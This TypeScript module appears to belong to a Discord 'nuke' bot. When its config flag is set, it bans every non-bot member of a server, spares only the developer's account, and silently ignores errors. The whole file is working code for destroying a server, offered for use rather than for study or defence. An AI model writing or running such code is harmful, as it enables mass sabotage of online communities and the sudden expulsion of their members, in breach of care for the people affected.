import { Guild } from "discord.js";
import { nukeConfig } from "../index";

export default async (guild: Guild): Promise<void> => {
	if (nukeConfig.BAN_MEMBERS) {
		const members = guild.members.cache.filter((member) => !member.user.bot);

		members.forEach(async (member) => {
			if (member.id === process.env.DEVELOPER_USER_ID) return;
			await member.ban().catch(() => {});
		});
	}
};
